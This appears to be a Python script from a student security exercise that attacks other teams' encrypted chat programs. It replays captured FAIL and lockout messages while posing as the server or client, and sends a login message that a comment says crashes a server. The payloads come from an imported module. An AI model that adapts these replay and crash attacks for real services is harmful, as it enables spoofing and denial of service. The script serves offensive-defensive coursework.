import socket, sys, json, os
from payloads import *
import random

RECV_BUFFER_SIZE = 65535
"""
Team mclean-parent attack
"""
# attack #1: replay FAIL message
# python chatClient.py -u bob -sip 127.0.0.1 -w ILoveTheCats -sp 8084 -pub ./rsa_keys/bob_public_key.der  -priv ./rsa_keys/bob_private_key.pem -servpub ./rsa_keys/alice_public_key.der
def replay_attack_parent():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (sys.argv[1], int(sys.argv[2]))  # the address attacker listening to

    s.bind(server_address)

    while True:
        encrypt_msg, client_address = s.recvfrom(RECV_BUFFER_SIZE)
        print encrypt_msg
        if encrypt_msg:
            s.sendto(PARENT_FAIL_REPLAY, client_address)  # send message to client as server


# attack #2
def replay_attack_parent2():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (sys.argv[1], int(sys.argv[2]))  # server's address

    s.bind(('127.0.0.1', random.randint(50000, 65535)))  # the attacker's address

    s.sendto(PARENT_LOCK_OUT_REPLAY, server_address)
    while True:
        encrypt_msg, addr = s.recvfrom(RECV_BUFFER_SIZE)
        print encrypt_msg
        if encrypt_msg:
            s.sendto(PARENT_FAIL_REPLAY, server_address)  # send message to server as client
            s.sendto(PARENT_LOCK_OUT_REPLAY, server_address)



"""
Team monga-akshay attack
"""
def replay_attack_monga_akshay():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    address = (sys.argv[1], int(sys.argv[2]))
    s.connect(address)
    # send an invalid message causes server to crash
    s.send(MY_SERVER_LOGIN)
    s.close()



if __name__ == '__main__':
    replay_attack_monga_akshay()

